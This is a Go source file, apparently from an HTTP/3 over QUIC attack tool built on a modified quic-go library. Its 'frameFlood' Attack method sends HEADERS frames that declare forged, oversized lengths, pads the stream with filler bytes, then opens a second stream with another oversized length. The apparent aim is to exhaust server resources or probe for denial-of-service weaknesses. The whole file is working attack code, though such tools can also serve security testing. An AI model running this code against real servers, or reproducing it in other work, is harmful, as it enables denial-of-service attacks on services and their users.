package main

import (
	"bytes"
	"encoding/binary"
	"log"
	"time"

	"github.com/k4ra5u/quic-go/internal/protocol"
	"github.com/k4ra5u/quic-go/internal/wire"
)

type frameFlood struct {
	BaseArgs
}

func (frameFlood *frameFlood) Attack() (response *HTTPMessage, err error) {

	session, cancel, err := frameFlood.Make_one_session()
	defer func() {
		_ = session.CloseWithError(0, "")
		cancel()
	}()
	requestStream, err := session.OpenStream()
	if err != nil {
		return nil, err
	}

	//构造HEADERS数据包：
	firstRange := bytes.NewBuffer(nil)

	firstRange.Write([]byte("\x01"))
	header_size := uint64(0x3FFFFFFFFFFFFFFF)
	//header_size = 0x60000
	qpack_header_size := 3<<62 + header_size
	buf_header_size := new(bytes.Buffer)
	binary.Write(buf_header_size, binary.BigEndian, qpack_header_size)
	firstRange.Write(buf_header_size.Bytes())

	forge_header_size := (uint64)(0xffffff)
	qpack_header_size = 3<<62 + forge_header_size
	buf_header_size = new(bytes.Buffer)
	binary.Write(buf_header_size, binary.BigEndian, qpack_header_size)
	forgeRange := bytes.NewBuffer(nil)
	forgeRange.Write([]byte("\x01"))
	forgeRange.Write(buf_header_size.Bytes())
	firgeFrame := &wire.StreamFrame{
		StreamID:       0,
		Offset:         protocol.ByteCount(0),
		Data:           forgeRange.Bytes(),
		Fin:            false,
		DataLenPresent: true,
	}
	forge_frame := []wire.Frame{
		firgeFrame,
	}
	requestStream.(interface{ SendFramesDirect([]wire.Frame) }).SendFramesDirect(forge_frame)
	time.Sleep(time.Millisecond * 10)
	log.Printf("pre HEADERS finished")

	var all_headers uint64 = 300
	offset := firstRange.Len()
	for {
		if all_headers >= 1200 {
			sendFrame := &wire.StreamFrame{
				StreamID:       0,
				Offset:         protocol.ByteCount(offset),
				Data:           bytes.Repeat([]byte("A"), 1200),
				Fin:            false,
				DataLenPresent: true,
			}
			send_frame := []wire.Frame{
				sendFrame,
			}
			requestStream.(interface{ SendFramesDirect([]wire.Frame) }).SendFramesDirect(send_frame)
			all_headers -= 1200
			offset += 1200
		} else if all_headers > 0 {
			sendFrame := &wire.StreamFrame{
				StreamID:       0,
				Offset:         protocol.ByteCount(offset),
				Data:           bytes.Repeat([]byte("B"), (int)(all_headers)),
				Fin:            false,
				DataLenPresent: true,
			}
			send_frame := []wire.Frame{
				sendFrame,
			}
			requestStream.(interface{ SendFramesDirect([]wire.Frame) }).SendFramesDirect(send_frame)
			offset += (int)(all_headers)
			time.Sleep(time.Millisecond * 10)
			break
		} else {
			break
		}
		time.Sleep(time.Millisecond * 10)
	}

	time.Sleep(time.Millisecond * 200)
	requestStream2, _ := session.OpenStream()
	if requestStream2 == nil {
		log.Printf("CC dected")
		return nil, nil
	}
	forge_header_size = (uint64)(0xffffff + 1)
	qpack_header_size = 3<<62 + forge_header_size
	buf_header_size = new(bytes.Buffer)
	binary.Write(buf_header_size, binary.BigEndian, qpack_header_size)
	forgeRange = bytes.NewBuffer(nil)
	forgeRange.Write([]byte("\x01"))
	forgeRange.Write(buf_header_size.Bytes())
	_, _ = requestStream2.Write(forgeRange.Bytes())
	time.Sleep(time.Millisecond * 300)

	log.Printf("header of HEADERS finished")
	return nil, nil
}
